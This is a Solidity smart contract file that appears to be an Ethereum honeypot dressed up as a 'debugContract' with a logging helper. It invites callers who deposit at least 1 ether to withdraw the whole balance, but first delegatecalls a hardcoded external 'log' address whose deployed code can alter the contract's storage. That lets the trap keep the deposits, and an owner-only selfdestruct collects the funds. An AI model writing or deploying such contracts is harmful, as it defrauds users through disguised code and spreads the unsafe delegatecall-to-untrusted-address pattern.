pragma solidity 0.4.19;
contract loglibs {
   mapping (address => uint256) public sendList;
   
   function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }

}

contract debugContract
{
    address Owner=msg.sender;
    uint256 public Limit= 1 ether;
    address loglib = 0xBC3A2d9D5Cf09013FB6ED85d97B180EaF76000Bd; //log

    function()payable public{}
    
    function withdrawal()
    payable public
    {

        if(msg.value>=Limit)
        {
            loglib.delegatecall(bytes4(sha3("logSendEvent()"))); //Log the address
            msg.sender.send(this.balance);
        }
    }

    function kill() public {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }

}